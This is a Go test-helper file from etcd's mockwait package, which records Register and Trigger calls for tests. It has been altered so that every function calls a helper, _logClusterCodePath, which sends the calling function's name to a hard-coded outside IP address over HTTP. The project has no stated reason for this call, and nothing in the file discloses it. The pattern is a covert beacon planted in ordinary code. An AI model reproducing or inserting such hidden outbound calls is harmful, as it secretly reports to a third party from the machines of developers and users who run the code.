package mockwait

import (
	godefaultbytes "bytes"
	"github.com/coreos/etcd/pkg/testutil"
	"github.com/coreos/etcd/pkg/wait"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type WaitRecorder struct {
	wait.Wait
	testutil.Recorder
}
type waitRecorder struct{ testutil.RecorderBuffered }

func NewRecorder() *WaitRecorder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	wr := &waitRecorder{}
	return &WaitRecorder{Wait: wr, Recorder: wr}
}
func NewNop() wait.Wait {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return NewRecorder()
}
func (w *waitRecorder) Register(id uint64) <-chan interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.Record(testutil.Action{Name: "Register"})
	return nil
}
func (w *waitRecorder) Trigger(id uint64, x interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.Record(testutil.Action{Name: "Trigger"})
}
func (w *waitRecorder) IsRegistered(id uint64) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	panic("waitRecorder.IsRegistered() shouldn't be called")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
